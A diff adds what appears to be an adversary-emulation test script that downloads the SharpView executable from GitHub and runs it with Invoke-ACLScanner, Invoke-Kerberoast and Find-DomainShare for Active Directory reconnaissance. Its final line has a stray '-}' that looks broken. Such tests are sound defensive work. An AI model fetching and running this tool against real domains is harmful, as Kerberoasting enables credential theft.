@@ -1,0 +1,19 @@
+#TechniqueName: System Network Connections Discovery
+#AtomicTestName: System Discovery using SharpView
+#Language: ps1
+
+#get_prereq_commands
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1049\bin\SharpView.exe) -ErrorAction ignore | Out-Null
+Invoke-WebRequest https://github.com/tevora-threat/SharpView/blob/b60456286b41bb055ee7bc2a14d645410cca9b74/Compiled/SharpView.exe?raw=true -OutFile "PathToAtomicsFolder\T1049\bin\SharpView.exe"
+
+
+#prereq_commands
+if (Test-Path PathToAtomicsFolder\T1049\bin\SharpView.exe) {exit 0} else {exit 1}
+
+
+#commands
+$syntaxList = "Invoke-ACLScanner", "Invoke-Kerberoast", "Find-DomainShare" 
+
+foreach ($syntax in $syntaxList) {
+PathToAtomicsFolder\T1049\bin\SharpView.exe $syntax -}
+
